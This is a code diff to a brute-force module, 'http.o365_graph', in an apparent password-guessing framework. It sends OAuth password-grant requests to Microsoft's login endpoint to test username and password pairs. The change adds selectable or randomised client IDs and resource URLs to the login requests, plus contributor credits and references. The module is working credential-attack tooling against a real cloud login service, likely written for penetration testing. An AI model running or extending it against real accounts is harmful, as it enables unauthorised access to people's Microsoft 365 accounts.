@@ -1,16 +1,19 @@
 import re
 import inspect
 from bfg.data import loadAzureSSOSoap
-from bfg.args import http as http_args
+from bfg.args import http as http_args, argument
 from requests import Session
 from bfg.shortcuts.http import HTTPModule, handleUA
-from bfg.shortcuts.azure_errors import *
+from bfg.shortcuts.azure import *
 from requests.exceptions import ConnectionError
 
 MSONLINE_URL    = 'https://login.microsoftonline.com'
 MSONLINE_NETLOC = 'login.microsoftonline.com'
 O365_URL        = 'https://outlook.office365.com'
 AUTH_PATH       = '/common/oauth2/token'
+
+DEFAULT_RESOURCE_URL  = 'https://graph.windows.net'
+DEFAULT_CLIENT_ID     = '1b730954-1685-4b74-9bfd-dac224a7b894'
 
 def strip_slash(s):
 
@@ -41,15 +44,30 @@ class Session(Session):
         headers['Accept']='application/json'
         self.headers.update(headers)
 
-    def authenticate(self,username,password):
+    def authenticate(self, username, password, client_id,
+            resource_url):
         '''Authenticate the credentials via the Graph API.
         '''
 
         credential = f'{username}:{password}'
 
+        # ==================================
+        # PREPARE THE CLIENT/RESOURCE VALUES
+        # ==================================
+
+        if resource_url == 'RANDOM':
+            name, resource_url = getRandomResource()
+
+        if client_id == 'RANDOM':
+            client, tag, client_id = getRandomClientID()
+
+        # ================
+        # MAKE THE REQUEST
+        # ================
+
         # Create the POST data
-        data = {'resource':'https://graph.windows.net',
-            'client_id':'1b730954-1685-4b74-9bfd-dac224a7b894',
+        data = {'resource':resource_url,
+            'client_id':client_id,
             'client_info':'1',
             'grant_type':'password',
             'username':username,
@@ -61,6 +79,10 @@ class Session(Session):
                 data=data,
                 allow_redirects=self.allow_redirects,
                 verify=self.verify_ssl)
+
+        # ===================
+        # HANDLE THE RESPONSE
+        # ===================
 
         # Search the response for error codes
         error_code = re.search(ERROR_CODE_RE, resp.text)
@@ -90,6 +112,20 @@ def url():
         default=MSONLINE_URL,
         help='Microsoft Online URL to target. Default: %(default)s')
 
+@argument
+def clientID(name_or_flags=('--client-id',),
+        default=DEFAULT_CLIENT_ID,
+        help='Client ID (UUID) to use. Supply RANDOM to select a'
+            ' random value.'):
+    pass
+
+@argument
+def resourceURL(name_or_flags=('--resource-url',),
+        default=DEFAULT_RESOURCE_URL,
+        help='Resource URL to use. Supply RANDOM to select a '
+            'random value'):
+    pass
+
 class Module(HTTPModule):
 
     name = 'http.o365_graph'
@@ -98,17 +134,38 @@ class Module(HTTPModule):
 
     description = 'Brute force the Office365 Graph API.'
 
-    args = [url()]+http_args.getDefaults('url', invert=True)
+    args = [url()] + http_args.getDefaults('url', invert=True) + \
+            [clientID(), resourceURL(),]
 
     contributors = [
             dict(
                 name='Justin Angel [Creator]',
                 additional=dict(
                     company='Black Hills Information Security',
-                    twitter='@ImposterKeanu'))
+                    twitter='@ImposterKeanu')),
+            dict(
+                name='Steve Borosh [Researcher]',
+                additional=dict(
+                    company='Black Hills Information Security',
+                    twitter='@rvrsh3ll')),
         ]
 
-    references = []
+    references = [
+            'Gerenios - Client IDs - https://github.com/Gerenios/' \
+                'AADInternals/blob/master/AccessToken_utils.ps1#L11',
+            'rvrsh3ll - Obscure error handling - https://github.com/' \
+                'rvrsh3ll/aad-sso-enum-brute-spray',
+        ]
+
+    def __init__(self, url, proxies, headers, verify_ssl, user_agent,
+            allow_redirects, client_id, resource_url,
+            *args, **kwargs):
+
+        super().__init__(url, proxies, headers, verify_ssl, user_agent,
+            allow_redirects, *args, **kwargs)
+
+        self.client_id = client_id
+        self.resource_url = resource_url
 
     @handleUA 
     def __call__(self, username, password, *args, **kwargs):
@@ -127,7 +184,11 @@ class Module(HTTPModule):
         try:
 
             outcome, valid_account, events = \
-                session.authenticate(username, password)
+                session.authenticate(
+                    username = username,
+                    password = password,
+                    client_id = self.client_id,
+                    resource_url = self.resource_url)
 
         except ConnectionError:
 
